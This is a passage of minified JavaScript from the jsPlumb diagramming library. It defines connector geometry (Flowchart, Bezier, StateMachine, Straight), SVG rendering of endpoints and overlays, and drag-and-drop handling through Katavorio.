                      , q = o && i || !o && !i ? f[3] : d[1];
                    e.addSegment(a, "Straight", {
                        x1: f[0],
                        y1: f[1],
                        x2: f[2],
                        y2: f[3]
                    }),
                    e.addSegment(a, "Arc", {
                        r: h,
                        x1: f[2],
                        y1: f[3],
                        x2: d[0],
                        y2: d[1],
                        cx: p,
                        cy: q,
                        ac: i
                    })
                } else {
                    var r = f[2] === f[0] ? 0 : f[2] > f[0] ? c.lw / 2 : -(c.lw / 2)
                      , s = f[3] === f[1] ? 0 : f[3] > f[1] ? c.lw / 2 : -(c.lw / 2);
                    e.addSegment(a, "Straight", {
                        x1: f[0] - r,
                        y1: f[1] - s,
                        x2: f[2] + r,
                        y2: f[3] + s
                    })
                }
                f = d
            }
            null != d && e.addSegment(a, "Straight", {
                x1: d[0],
                y1: d[1],
                x2: d[2],
                y2: d[3]
            })
        };
        this._compute = function(a, b) {
            c = [],
            h = null,
            i = null,
            d = null;
            var j = function() {
                return [a.startStubX, a.startStubY, a.endStubX, a.endStubY]
            }
              , k = {
                perpendicular: j,
                orthogonal: j,
                opposite: function(b) {
                    var c = a
                      , d = "x" === b ? 0 : 1
                      , e = {
                        x: function() {
                            return 1 === c.so[d] && (c.startStubX > c.endStubX && c.tx > c.startStubX || c.sx > c.endStubX && c.tx > c.sx) || c.so[d] === -1 && (c.startStubX < c.endStubX && c.tx < c.startStubX || c.sx < c.endStubX && c.tx < c.sx)
                        },
                        y: function() {
                            return 1 === c.so[d] && (c.startStubY > c.endStubY && c.ty > c.startStubY || c.sy > c.endStubY && c.ty > c.sy) || c.so[d] === -1 && (c.startStubY < c.endStubY && c.ty < c.startStubY || c.sy < c.endStubY && c.ty < c.sy)
                        }
                    };
                    return !g && e[b]() ? {
                        x: [(a.sx + a.tx) / 2, a.startStubY, (a.sx + a.tx) / 2, a.endStubY],
                        y: [a.startStubX, (a.sy + a.ty) / 2, a.endStubX, (a.sy + a.ty) / 2]
                    }[b] : [a.startStubX, a.startStubY, a.endStubX, a.endStubY]
                }
            }
              , m = k[a.anchorOrientation](a.sourceAxis)
              , n = "x" === a.sourceAxis ? 0 : 1
              , p = "x" === a.sourceAxis ? 1 : 0
              , q = m[n]
              , r = m[p]
              , s = m[n + 2]
              , t = m[p + 2];
            l(c, m[0], m[1], a);
            var u = a.startStubX + (a.endStubX - a.startStubX) * f
              , v = a.startStubY + (a.endStubY - a.startStubY) * f
              , w = {
                x: [0, 1],
                y: [1, 0]
            }
              , x = {
                perpendicular: function(b) {
                    var c = a
                      , d = {
                        x: [[[1, 2, 3, 4], null, [2, 1, 4, 3]], null, [[4, 3, 2, 1], null, [3, 4, 1, 2]]],
                        y: [[[3, 2, 1, 4], null, [2, 3, 4, 1]], null, [[4, 1, 2, 3], null, [1, 4, 3, 2]]]
                    }
                      , e = {
                        x: [[c.startStubX, c.endStubX], null, [c.endStubX, c.startStubX]],
                        y: [[c.startStubY, c.endStubY], null, [c.endStubY, c.startStubY]]
                    }
                      , f = {
                        x: [[u, c.startStubY], [u, c.endStubY]],
                        y: [[c.startStubX, v], [c.endStubX, v]]
                    }
                      , g = {
                        x: [[c.endStubX, c.startStubY]],
                        y: [[c.startStubX, c.endStubY]]
                    }
                      , h = {
                        x: [[c.startStubX, c.endStubY], [c.endStubX, c.endStubY]],
                        y: [[c.endStubX, c.startStubY], [c.endStubX, c.endStubY]]
                    }
                      , i = {
                        x: [[c.startStubX, v], [c.endStubX, v], [c.endStubX, c.endStubY]],
                        y: [[u, c.startStubY], [u, c.endStubY], [c.endStubX, c.endStubY]]
                    }
                      , j = {
                        x: [c.startStubY, c.endStubY],
                        y: [c.startStubX, c.endStubX]
                    }
                      , k = w[b][0]
                      , l = w[b][1]
                      , m = c.so[k] + 1
                      , n = c.to[l] + 1
                      , o = c.to[l] === -1 && j[b][1] < j[b][0] || 1 === c.to[l] && j[b][1] > j[b][0]
                      , p = e[b][m][0]
                      , q = e[b][m][1]
                      , r = d[b][m][n];
                    return c.segment === r[3] || c.segment === r[2] && o ? f[b] : c.segment === r[2] && q < p ? g[b] : c.segment === r[2] && q >= p || c.segment === r[1] && !o ? i[b] : c.segment === r[0] || c.segment === r[1] && o ? h[b] : void 0
                },
                orthogonal: function(b, c, d, e, f) {
                    var g = a
                      , h = {
                        x: g.so[0] === -1 ? Math.min(c, e) : Math.max(c, e),
                        y: g.so[1] === -1 ? Math.min(c, e) : Math.max(c, e)
                    }[b];
                    return {
                        x: [[h, d], [h, f], [e, f]],
                        y: [[d, h], [f, h], [f, e]]
                    }[b]
                },
                opposite: function(c, d, f, g) {
                    var h = a
                      , i = {
                        x: "y",
                        y: "x"
                    }[c]
                      , j = {
                        x: "height",
                        y: "width"
                    }[c]
                      , k = h["is" + c.toUpperCase() + "GreaterThanStubTimes2"];
                    if (b.sourceEndpoint.elementId === b.targetEndpoint.elementId) {
                        var l = f + (1 - b.sourceEndpoint.anchor[i]) * b.sourceInfo[j] + e.maxStub;
                        return {
                            x: [[d, l], [g, l]],
                            y: [[l, d], [l, g]]
                        }[c]
                    }
                    return !k || 1 === h.so[n] && d > g || h.so[n] === -1 && d < g ? {
                        x: [[d, v], [g, v]],
                        y: [[u, d], [u, g]]
                    }[c] : 1 === h.so[n] && d < g || h.so[n] === -1 && d > g ? {
                        x: [[u, h.sy], [u, h.ty]],
                        y: [[h.sx, v], [h.tx, v]]
                    }[c] : void 0
                }
            }
              , y = x[a.anchorOrientation](a.sourceAxis, q, r, s, t);
            if (y)
                for (var z = 0; z < y.length; z++)
                    l(c, y[z][0], y[z][1], a);
            l(c, m[2], m[3], a),
            l(c, a.tx, a.ty, a),
            o(this, c, a)
        }
    };
    c.extend(d, b.Connectors.AbstractConnector),
    b.registerConnectorType(d, "Flowchart")
}
.call("undefined" != typeof window ? window : this),
function() {
    "use strict";
    var a = this
      , b = a.jsPlumb
      , c = a.jsPlumbUtil;
    b.Connectors.AbstractBezierConnector = function(a) {
        a = a || {};
        var c, d = a.showLoopback !== !1, e = (a.curviness || 10,
        a.margin || 5), f = (a.proximityLimit || 80,
        a.orientation && "clockwise" === a.orientation), g = a.loopbackRadius || 25, h = !1;
        return this.overrideSetEditable = function() {
            return !h
        }
        ,
        this._compute = function(a, b) {
            var i = b.sourcePos
              , j = b.targetPos
              , k = Math.abs(i[0] - j[0])
              , l = Math.abs(i[1] - j[1]);
            if (d && b.sourceEndpoint.elementId === b.targetEndpoint.elementId) {
                h = !0;
                var m = b.sourcePos[0]
                  , n = b.sourcePos[1] - e
                  , o = m
                  , p = n - g
                  , q = o - g
                  , r = p - g;
                k = 2 * g,
                l = 2 * g,
                a.points[0] = q,
                a.points[1] = r,
                a.points[2] = k,
                a.points[3] = l,
                c.addSegment(this, "Arc", {
                    loopback: !0,
                    x1: m - q + 4,
                    y1: n - r,
                    startAngle: 0,
                    endAngle: 2 * Math.PI,
                    r: g,
                    ac: !f,
                    x2: m - q - 4,
                    y2: n - r,
                    cx: o - q,
                    cy: p - r
                })
            } else
                h = !1,
                this._computeBezier(a, b, i, j, k, l)
        }
        ,
        c = b.Connectors.AbstractConnector.apply(this, arguments)
    }
    ,
    c.extend(b.Connectors.AbstractBezierConnector, b.Connectors.AbstractConnector);
    var d = function(a) {
        a = a || {},
        this.type = "Bezier";
        var c = b.Connectors.AbstractBezierConnector.apply(this, arguments)
          , d = a.curviness || 150
          , e = 10;
        this.getCurviness = function() {
            return d
        }
        ,
        this._findControlPoint = function(a, b, c, f, g, h, i) {
            var j = h[0] !== i[0] || h[1] === i[1]
              , k = [];
            return j ? (0 === i[0] ? k.push(c[0] < b[0] ? a[0] + e : a[0] - e) : k.push(a[0] + d * i[0]),
            0 === i[1] ? k.push(c[1] < b[1] ? a[1] + e : a[1] - e) : k.push(a[1] + d * h[1])) : (0 === h[0] ? k.push(b[0] < c[0] ? a[0] + e : a[0] - e) : k.push(a[0] - d * h[0]),
            0 === h[1] ? k.push(b[1] < c[1] ? a[1] + e : a[1] - e) : k.push(a[1] + d * i[1])),
            k
        }
        ,
        this._computeBezier = function(a, b, d, e, f, g) {
            var h, i, j = this.getGeometry(), k = d[0] < e[0] ? f : 0, l = d[1] < e[1] ? g : 0, m = d[0] < e[0] ? 0 : f, n = d[1] < e[1] ? 0 : g;
            (this.hasBeenEdited() || this.isEditing()) && null != j && null != j.controlPoints && null != j.controlPoints[0] && null != j.controlPoints[1] ? (h = j.controlPoints[0],
            i = j.controlPoints[1]) : (h = this._findControlPoint([k, l], d, e, b.sourceEndpoint, b.targetEndpoint, a.so, a.to),
            i = this._findControlPoint([m, n], e, d, b.targetEndpoint, b.sourceEndpoint, a.to, a.so)),
            c.setGeometry({
                controlPoints: [h, i]
            }, !0),
            c.addSegment(this, "Bezier", {
                x1: k,
                y1: l,
                x2: m,
                y2: n,
                cp1x: h[0],
                cp1y: h[1],
                cp2x: i[0],
                cp2y: i[1]
            })
        }
    };
    c.extend(d, b.Connectors.AbstractBezierConnector),
    b.registerConnectorType(d, "Bezier")
}
.call("undefined" != typeof window ? window : this),
function() {
    "use strict";
    var a = this
      , b = a.jsPlumb
      , c = a.jsPlumbUtil
      , d = function(a, b, c, d) {
        return a <= c && d <= b ? 1 : a <= c && b <= d ? 2 : c <= a && d >= b ? 3 : 4
    }
      , e = function(a, b, c, d, e, f, g, h, i) {
        return h <= i ? [a, b] : 1 === c ? d[3] <= 0 && e[3] >= 1 ? [a + (d[2] < .5 ? -1 * f : f), b] : d[2] >= 1 && e[2] <= 0 ? [a, b + (d[3] < .5 ? -1 * g : g)] : [a + -1 * f, b + -1 * g] : 2 === c ? d[3] >= 1 && e[3] <= 0 ? [a + (d[2] < .5 ? -1 * f : f), b] : d[2] >= 1 && e[2] <= 0 ? [a, b + (d[3] < .5 ? -1 * g : g)] : [a + f, b + -1 * g] : 3 === c ? d[3] >= 1 && e[3] <= 0 ? [a + (d[2] < .5 ? -1 * f : f), b] : d[2] <= 0 && e[2] >= 1 ? [a, b + (d[3] < .5 ? -1 * g : g)] : [a + -1 * f, b + -1 * g] : 4 === c ? d[3] <= 0 && e[3] >= 1 ? [a + (d[2] < .5 ? -1 * f : f), b] : d[2] <= 0 && e[2] >= 1 ? [a, b + (d[3] < .5 ? -1 * g : g)] : [a + f, b + -1 * g] : void 0
    }
      , f = function(a) {
        a = a || {},
        this.type = "StateMachine";
        var c, f = b.Connectors.AbstractBezierConnector.apply(this, arguments), g = a.curviness || 10, h = a.margin || 5, i = a.proximityLimit || 80;
        a.orientation && "clockwise" === a.orientation;
        this._computeBezier = function(a, b, j, k, l, m) {
            var n = b.sourcePos[0] < b.targetPos[0] ? 0 : l
              , o = b.sourcePos[1] < b.targetPos[1] ? 0 : m
              , p = b.sourcePos[0] < b.targetPos[0] ? l : 0
              , q = b.sourcePos[1] < b.targetPos[1] ? m : 0;
            0 === b.sourcePos[2] && (n -= h),
            1 === b.sourcePos[2] && (n += h),
            0 === b.sourcePos[3] && (o -= h),
            1 === b.sourcePos[3] && (o += h),
            0 === b.targetPos[2] && (p -= h),
            1 === b.targetPos[2] && (p += h),
            0 === b.targetPos[3] && (q -= h),
            1 === b.targetPos[3] && (q += h);
            var r, s, t, u, v = (n + p) / 2, w = (o + q) / 2, x = d(n, o, p, q), y = Math.sqrt(Math.pow(p - n, 2) + Math.pow(q - o, 2)), z = f.getGeometry();
            (this.hasBeenEdited() || this.isEditing()) && null != z ? (r = z.controlPoints[0][0],
            t = z.controlPoints[0][1],
            s = z.controlPoints[1][0],
            u = z.controlPoints[1][1]) : (c = e(v, w, x, b.sourcePos, b.targetPos, g, g, y, i),
            r = c[0],
            s = c[0],
            t = c[1],
            u = c[1],
            f.setGeometry({
                controlPoints: [c, c]
            }, !0)),
            f.addSegment(this, "Bezier", {
                x1: p,
                y1: q,
                x2: n,
                y2: o,
                cp1x: r,
                cp1y: t,
                cp2x: s,
                cp2y: u
            })
        }
    };
    c.extend(f, b.Connectors.AbstractBezierConnector),
    b.registerConnectorType(f, "StateMachine")
}
.call("undefined" != typeof window ? window : this),
function() {
    "use strict";
    var a = this
      , b = a.jsPlumb
      , c = a.jsPlumbUtil
      , d = "Straight"
      , e = function(a) {
        this.type = d;
        var c = b.Connectors.AbstractConnector.apply(this, arguments);
        this._compute = function(a, b) {
            c.addSegment(this, d, {
                x1: a.sx,
                y1: a.sy,
                x2: a.startStubX,
                y2: a.startStubY
            }),
            c.addSegment(this, d, {
                x1: a.startStubX,
                y1: a.startStubY,
                x2: a.endStubX,
                y2: a.endStubY
            }),
            c.addSegment(this, d, {
                x1: a.endStubX,
                y1: a.endStubY,
                x2: a.tx,
                y2: a.ty
            })
        }
    };
    c.extend(e, b.Connectors.AbstractConnector),
    b.registerConnectorType(e, d)
}
.call("undefined" != typeof window ? window : this),
function() {
    "use strict";
    var a = this
      , b = a.jsPlumb
      , c = a.jsPlumbUtil
      , d = {
        "stroke-linejoin": "stroke-linejoin",
        "stroke-dashoffset": "stroke-dashoffset",
        "stroke-linecap": "stroke-linecap"
    }
      , e = "stroke-dasharray"
      , f = "dashstyle"
      , g = "linearGradient"
      , h = "radialGradient"
      , i = "defs"
      , j = "fill"
      , k = "stop"
      , l = "stroke"
      , m = "stroke-width"
      , n = "style"
      , o = "none"
      , p = "jsplumb_gradient_"
      , q = "strokeWidth"
      , r = {
        svg: "http://www.w3.org/2000/svg"
    }
      , s = function(a, b) {
        for (var c in b)
            a.setAttribute(c, "" + b[c])
    }
      , t = function(a, c) {
        return c = c || {},
        c.version = "1.1",
        c.xmlns = r.svg,
        b.createElementNS(r.svg, a, null, null, c)
    }
      , u = function(a) {
        return "position:absolute;left:" + a[0] + "px;top:" + a[1] + "px"
    }
      , v = function(a) {
        for (var b = a.querySelectorAll(" defs,linearGradient,radialGradient"), c = 0; c < b.length; c++)
            b[c].parentNode.removeChild(b[c])
    }
      , w = function(a, b, c, d, e) {
        var f = p + e._jsPlumb.instance.idstamp();
        v(a);
        var m;
        m = c.gradient.offset ? t(h, {
            id: f
        }) : t(g, {
            id: f,
            gradientUnits: "userSpaceOnUse"
        });
        var n = t(i);
        a.appendChild(n),
        n.appendChild(m);
        for (var o = 0; o < c.gradient.stops.length; o++) {
            var q = 1 === e.segment || 2 === e.segment ? o : c.gradient.stops.length - 1 - o
              , r = c.gradient.stops[q][1]
              , s = t(k, {
                offset: Math.floor(100 * c.gradient.stops[o][0]) + "%",
                "stop-color": r
            });
            m.appendChild(s)
        }
        var u = c.stroke ? l : j;
        b.setAttribute(u, "url(#" + f + ")")
    }
      , x = function(a, b, c, g, h) {
        if (b.setAttribute(j, c.fill ? c.fill : o),
        b.setAttribute(l, c.stroke ? c.stroke : o),
        c.gradient ? w(a, b, c, g, h) : (v(a),
        b.setAttribute(n, "")),
        c.strokeWidth && b.setAttribute(m, c.strokeWidth),
        c[f] && c[q] && !c[e]) {
            var i = c[f].indexOf(",") === -1 ? " " : ","
              , k = c[f].split(i)
              , p = "";
            k.forEach(function(a) {
                p += Math.floor(a * c.strokeWidth) + i
            }),
            b.setAttribute(e, p)
        } else
            c[e] && b.setAttribute(e, c[e]);
        for (var r in d)
            c[r] && b.setAttribute(d[r], c[r])
    }
      , y = function(a, b, c) {
        a.childNodes.length > c ? a.insertBefore(b, a.childNodes[c]) : a.appendChild(b)
    };
    c.svg = {
        node: t,
        attr: s,
        pos: u
    };
    var z = function(a) {
        var d = a.pointerEventsSpec || "all"
          , e = {};
        b.jsPlumbUIComponent.apply(this, a.originalArgs),
        this.canvas = null,
        this.path = null,
        this.svg = null,
        this.bgCanvas = null;
        var f = a.cssClass + " " + (a.originalArgs[0].cssClass || "")
          , g = {
            style: "",
            width: 0,
            height: 0,
            "pointer-events": d,
            position: "absolute"
        };
        this.svg = t("svg", g),
        a.useDivWrapper ? (this.canvas = b.createElement("div", {
            position: "absolute"
        }),
        c.sizeElement(this.canvas, 0, 0, 1, 1),
        this.canvas.className = f) : (s(this.svg, {
            class: f
        }),
        this.canvas = this.svg),
        a._jsPlumb.appendElement(this.canvas, a.originalArgs[0].parent),
        a.useDivWrapper && this.canvas.appendChild(this.svg);
        var h = [this.canvas];
        return this.getDisplayElements = function() {
            return h
        }
        ,
        this.appendDisplayElement = function(a) {
            h.push(a)
        }
        ,
        this.paint = function(b, d, f) {
            if (null != b) {
                var g, h = [this.x, this.y], i = [this.w, this.h];
                null != f && (f.xmin < 0 && (h[0] += f.xmin),
                f.ymin < 0 && (h[1] += f.ymin),
                i[0] = f.xmax + (f.xmin < 0 ? -f.xmin : 0),
                i[1] = f.ymax + (f.ymin < 0 ? -f.ymin : 0)),
                a.useDivWrapper ? (c.sizeElement(this.canvas, h[0], h[1], i[0], i[1]),
                h[0] = 0,
                h[1] = 0,
                g = u([0, 0])) : g = u([h[0], h[1]]),
                e.paint.apply(this, arguments),
                s(this.svg, {
                    style: g,
                    width: i[0] || 0,
                    height: i[1] || 0
                })
            }
        }
        ,
        {
            renderer: e
        }
    };
    c.extend(z, b.jsPlumbUIComponent, {
        cleanup: function(a) {
            a || null == this.typeId ? (this.canvas && (this.canvas._jsPlumb = null),
            this.svg && (this.svg._jsPlumb = null),
            this.bgCanvas && (this.bgCanvas._jsPlumb = null),
            this.canvas && this.canvas.parentNode && this.canvas.parentNode.removeChild(this.canvas),
            this.bgCanvas && this.bgCanvas.parentNode && this.canvas.parentNode.removeChild(this.canvas),
            this.svg = null,
            this.canvas = null,
            this.path = null,
            this.group = null) : (this.canvas && this.canvas.parentNode && this.canvas.parentNode.removeChild(this.canvas),
            this.bgCanvas && this.bgCanvas.parentNode && this.bgCanvas.parentNode.removeChild(this.bgCanvas))
        },
        reattach: function(a) {
            var b = a.getContainer();
            this.canvas && null == this.canvas.parentNode && b.appendChild(this.canvas),
            this.bgCanvas && null == this.bgCanvas.parentNode && b.appendChild(this.bgCanvas)
        },
        setVisible: function(a) {
            this.canvas && (this.canvas.style.display = a ? "block" : "none")
        }
    }),
    b.ConnectorRenderers.svg = function(a) {
        var c = this
          , d = z.apply(this, [{
            cssClass: a._jsPlumb.connectorClass + (this.isEditable() ? " " + a._jsPlumb.editableConnectorClass : ""),
            originalArgs: arguments,
            pointerEventsSpec: "none",
            _jsPlumb: a._jsPlumb
        }])
          , e = this.setEditable;
        this.setEditable = function(a) {
            var c = e.apply(this, [a]);
            b[c ? "addClass" : "removeClass"](this.canvas, this._jsPlumb.instance.editableConnectorClass)
        }
        ,
        d.renderer.paint = function(d, e, f) {
            var g = c.getSegments()
              , h = ""
              , i = [0, 0];
            if (f.xmin < 0 && (i[0] = -f.xmin),
            f.ymin < 0 && (i[1] = -f.ymin),
            g.length > 0) {
                h = c.getPathData();
                var j = {
                    d: h,
                    transform: "translate(" + i[0] + "," + i[1] + ")",
                    "pointer-events": a["pointer-events"] || "visibleStroke"
                }
                  , k = null
                  , l = [c.x, c.y, c.w, c.h];
                if (d.outlineStroke) {
                    var m = d.outlineWidth || 1
                      , n = d.strokeWidth + 2 * m;
                    k = b.extend({}, d),
                    delete k.gradient,
                    k.stroke = d.outlineStroke,
                    k.strokeWidth = n,
                    null == c.bgPath ? (c.bgPath = t("path", j),
                    b.addClass(c.bgPath, b.connectorOutlineClass),
                    y(c.svg, c.bgPath, 0)) : s(c.bgPath, j),
                    x(c.svg, c.bgPath, k, l, c)
                }
                null == c.path ? (c.path = t("path", j),
                y(c.svg, c.path, d.outlineStroke ? 1 : 0)) : s(c.path, j),
                x(c.svg, c.path, d, l, c)
            }
        }
    }
    ,
    c.extend(b.ConnectorRenderers.svg, z);
    var A = b.SvgEndpoint = function(a) {
        var c = z.apply(this, [{
            cssClass: a._jsPlumb.endpointClass,
            originalArgs: arguments,
            pointerEventsSpec: "all",
            useDivWrapper: !0,
            _jsPlumb: a._jsPlumb
        }]);
        c.renderer.paint = function(a) {
            var c = b.extend({}, a);
            c.outlineStroke && (c.stroke = c.outlineStroke),
            null == this.node ? (this.node = this.makeNode(c),
            this.svg.appendChild(this.node)) : null != this.updateNode && this.updateNode(this.node),
            x(this.svg, this.node, c, [this.x, this.y, this.w, this.h], this),
            u(this.node, [this.x, this.y])
        }
        .bind(this)
    }
    ;
    c.extend(A, z),
    b.Endpoints.svg.Dot = function() {
        b.Endpoints.Dot.apply(this, arguments),
        A.apply(this, arguments),
        this.makeNode = function(a) {
            return t("circle", {
                cx: this.w / 2,
                cy: this.h / 2,
                r: this.radius
            })
        }
        ,
        this.updateNode = function(a) {
            s(a, {
                cx: this.w / 2,
                cy: this.h / 2,
                r: this.radius
            })
        }
    }
    ,
    c.extend(b.Endpoints.svg.Dot, [b.Endpoints.Dot, A]),
    b.Endpoints.svg.Rectangle = function() {
        b.Endpoints.Rectangle.apply(this, arguments),
        A.apply(this, arguments),
        this.makeNode = function(a) {
            return t("rect", {
                width: this.w,
                height: this.h
            })
        }
        ,
        this.updateNode = function(a) {
            s(a, {
                width: this.w,
                height: this.h
            })
        }
    }
    ,
    c.extend(b.Endpoints.svg.Rectangle, [b.Endpoints.Rectangle, A]),
    b.Endpoints.svg.Image = b.Endpoints.Image,
    b.Endpoints.svg.Blank = b.Endpoints.Blank,
    b.Overlays.svg.Label = b.Overlays.Label,
    b.Overlays.svg.Custom = b.Overlays.Custom;
    var B = function(a, c) {
        a.apply(this, c),
        b.jsPlumbUIComponent.apply(this, c),
        this.isAppendedAtTopLevel = !1;
        this.path = null,
        this.paint = function(a, b) {
            if (a.component.svg && b) {
                null == this.path && (this.path = t("path", {
                    "pointer-events": "all"
                }),
                a.component.svg.appendChild(this.path),
                this.elementCreated && this.elementCreated(this.path, a.component),
                this.canvas = a.component.svg);
                var e = c && 1 === c.length ? c[0].cssClass || "" : ""
                  , f = [0, 0];
                b.xmin < 0 && (f[0] = -b.xmin),
                b.ymin < 0 && (f[1] = -b.ymin),
                s(this.path, {
                    d: d(a.d),
                    class: e,
                    stroke: a.stroke ? a.stroke : null,
                    fill: a.fill ? a.fill : null,
                    transform: "translate(" + f[0] + "," + f[1] + ")"
                })
            }
        }
        ;
        var d = function(a) {
            return isNaN(a.cxy.x) || isNaN(a.cxy.y) ? "" : "M" + a.hxy.x + "," + a.hxy.y + " L" + a.tail[0].x + "," + a.tail[0].y + " L" + a.cxy.x + "," + a.cxy.y + " L" + a.tail[1].x + "," + a.tail[1].y + " L" + a.hxy.x + "," + a.hxy.y
        };
        this.transfer = function(a) {
            a.canvas && this.path && this.path.parentNode && (this.path.parentNode.removeChild(this.path),
            a.canvas.appendChild(this.path))
        }
    };
    c.extend(B, [b.jsPlumbUIComponent, b.Overlays.AbstractOverlay], {
        cleanup: function(a) {
            null != this.path && (a ? this._jsPlumb.instance.removeElement(this.path) : this.path.parentNode && this.path.parentNode.removeChild(this.path))
        },
        reattach: function(a) {
            this.path && this.canvas && null == this.path.parentNode && this.canvas.appendChild(this.path)
        },
        setVisible: function(a) {
            null != this.path && (this.path.style.display = a ? "block" : "none")
        }
    }),
    b.Overlays.svg.Arrow = function() {
        B.apply(this, [b.Overlays.Arrow, arguments])
    }
    ,
    c.extend(b.Overlays.svg.Arrow, [b.Overlays.Arrow, B]),
    b.Overlays.svg.PlainArrow = function() {
        B.apply(this, [b.Overlays.PlainArrow, arguments])
    }
    ,
    c.extend(b.Overlays.svg.PlainArrow, [b.Overlays.PlainArrow, B]),
    b.Overlays.svg.Diamond = function() {
        B.apply(this, [b.Overlays.Diamond, arguments])
    }
    ,
    c.extend(b.Overlays.svg.Diamond, [b.Overlays.Diamond, B]),
    b.Overlays.svg.GuideLines = function() {
        var a, c, d = null, e = this;
        b.Overlays.GuideLines.apply(this, arguments),
        this.paint = function(b, g) {
            null == d && (d = t("path"),
            b.connector.svg.appendChild(d),
            e.attachListeners(d, b.connector),
            e.attachListeners(d, e),
            a = t("path"),
            b.connector.svg.appendChild(a),
            e.attachListeners(a, b.connector),
            e.attachListeners(a, e),
            c = t("path"),
            b.connector.svg.appendChild(c),
            e.attachListeners(c, b.connector),
            e.attachListeners(c, e));
            var h = [0, 0];
            g.xmin < 0 && (h[0] = -g.xmin),
            g.ymin < 0 && (h[1] = -g.ymin),
            s(d, {
                d: f(b.head, b.tail),
                stroke: "red",
                fill: null,
                transform: "translate(" + h[0] + "," + h[1] + ")"
            }),
            s(a, {
                d: f(b.tailLine[0], b.tailLine[1]),
                stroke: "blue",
                fill: null,
                transform: "translate(" + h[0] + "," + h[1] + ")"
            }),
            s(c, {
                d: f(b.headLine[0], b.headLine[1]),
                stroke: "green",
                fill: null,
                transform: "translate(" + h[0] + "," + h[1] + ")"
            })
        }
        ;
        var f = function(a, b) {
            return "M " + a.x + "," + a.y + " L" + b.x + "," + b.y
        }
    }
    ,
    c.extend(b.Overlays.svg.GuideLines, b.Overlays.GuideLines)
}
.call("undefined" != typeof window ? window : this),
function() {
    "use strict";
    var a = this
      , b = a.jsPlumb
      , c = a.jsPlumbUtil
      , d = a.Katavorio
      , e = a.Biltong
      , f = function(a, c) {
        c = c || "main";
        var f = "_katavorio_" + c
          , g = a[f]
          , h = a.getEventManager();
        return g || (g = new d({
            bind: h.on,
            unbind: h.off,
            getSize: b.getSize,
            getPosition: function(b, c) {
                var d = a.getOffset(b, c, b._katavorioDrag ? b.offsetParent : null);
                return [d.left, d.top]
            },
            setPosition: function(a, b) {
                a.style.left = b[0] + "px",
                a.style.top = b[1] + "px"
            },
            addClass: b.addClass,
            removeClass: b.removeClass,
            intersects: e.intersects,
            indexOf: function(a, b) {
                return a.indexOf(b)
            },
            scope: a.getDefaultScope(),
            css: {
                noSelect: a.dragSelectClass,
                droppable: "jtk-droppable",
                draggable: "jtk-draggable",
                drag: "jtk-drag",
                selected: "jtk-drag-selected",
                active: "jtk-drag-active",
                hover: "jtk-drag-hover",
                ghostProxy: "jtk-ghost-proxy"
            }
        }),
        g.setZoom(a.getZoom()),
        a[f] = g,
        a.bind("zoom", g.setZoom)),
        g
    }
      , g = function(a, b) {
        var d = function(d) {
            if (null != b[d]) {
                if (c.isString(b[d])) {
                    var e = b[d].match(/-=/) ? -1 : 1
                      , f = b[d].substring(2);
                    return a[d] + e * f
                }
                return b[d]
            }
            return a[d]
        };
        return [d("left"), d("top")]
    };
    b.extend(a.jsPlumbInstance.prototype, {
        animationSupported: !0,
        getElement: function(a) {
            return null == a ? null : (a = "string" == typeof a ? a : null != a.length && null == a.enctype ? a[0] : a,
            "string" == typeof a ? document.getElementById(a) : a)
        },
        removeElement: function(a) {
            f(this).elementRemoved(a),
            this.getEventManager().remove(a)
        },
        doAnimate: function(a, c, d) {
            d = d || {};
            var e = this.getOffset(a)
              , f = g(e, c)
              , h = f[0] - e.left
              , i = f[1] - e.top
              , j = d.duration || 250
              , k = 15
              , l = j / k
              , m = k / j * h
              , n = k / j * i
              , o = 0
              , p = setInterval(function() {
                b.setPosition(a, {
                    left: e.left + m * (o + 1),
                    top: e.top + n * (o + 1)
                }),
                null != d.step && d.step(o, Math.ceil(l)),
                o++,
                o >= l && (window.clearInterval(p),
                null != d.complete && d.complete())
            }, k)
        },
        destroyDraggable: function(a, b) {
            f(this, b).destroyDraggable(a)
        },
        destroyDroppable: function(a, b) {
            f(this, b).destroyDroppable(a)
        },
        initDraggable: function(a, b, c) {
            f(this, c).draggable(a, b)
        },
        initDroppable: function(a, b, c) {
            f(this, c).droppable(a, b)
        },
        isAlreadyDraggable: function(a) {
            return null != a._katavorioDrag
        },
        isDragSupported: function(a, b) {
            return !0
        },
        isDropSupported: function(a, b) {
            return !0
        },
        isElementDraggable: function(a) {
            return a = b.getElement(a),
            a._katavorioDrag && a._katavorioDrag.isEnabled()
        },
        getDragObject: function(a) {
            return a[0].drag.getDragElement()
        },
        getDragScope: function(a) {
            return a._katavorioDrag && a._katavorioDrag.scopes.join(" ") || ""
        },
        getDropEvent: function(a) {
            return a[0].e
        },
        getUIPosition: function(a, b) {
            var c = a[0].el;
            if (null == c.offsetParent)
                return null;
            var d = a[0].finalPos || a[0].pos
              , e = {
                left: d[0],
                top: d[1]
            };
            if (c._katavorioDrag && c.offsetParent !== this.getContainer()) {
                var f = this.getOffset(c.offsetParent);
                e.left += f.left,
                e.top += f.top
            }
            return e
        },
        setDragFilter: function(a, b, c) {
            a._katavorioDrag && a._katavorioDrag.setFilter(b, c)
        },
        setElementDraggable: function(a, c) {
            a = b.getElement(a),
            a._katavorioDrag && a._katavorioDrag.setEnabled(c)
        },
        setDragScope: function(a, b) {
            a._katavorioDrag && a._katavorioDrag.k.setDragScope(a, b)
        },
        setDropScope: function(a, b) {
            a._katavorioDrop && a._katavorioDrop.length > 0 && a._katavorioDrop[0].k.setDropScope(a, b)
        },
        addToPosse: function(a, c) {
            var d = Array.prototype.slice.call(arguments, 1)
              , e = f(this);
            b.each(a, function(a) {
                a = [b.getElement(a)],
                a.push.apply(a, d),
                e.addToPosse.apply(e, a)
            })
        },
        setPosse: function(a, c) {
            var d = Array.prototype.slice.call(arguments, 1)
              , e = f(this);
            b.each(a, function(a) {
                a = [b.getElement(a)],
                a.push.apply(a, d),
                e.setPosse.apply(e, a)
            })
        },
        removeFromPosse: function(a, c) {
            var d = Array.prototype.slice.call(arguments, 1)
              , e = f(this);
            b.each(a, function(a) {
                a = [b.getElement(a)],
                a.push.apply(a, d),
                e.removeFromPosse.apply(e, a)
            })
        },
        removeFromAllPosses: function(a) {
            var c = f(this);
            b.each(a, function(a) {
                c.removeFromAllPosses(b.getElement(a))
            })
        },
        setPosseState: function(a, c, d) {
            var e = f(this);
            b.each(a, function(a) {
                e.setPosseState(b.getElement(a), c, d)
            })
        },
        dragEvents: {
            start: "start",
            stop: "stop",
            drag: "drag",
            step: "step",
            over: "over",
            out: "out",
            drop: "drop",
            complete: "complete",
            beforeStart: "beforeStart"
        },
        animEvents: {
            step: "step",
            complete: "complete"
        },
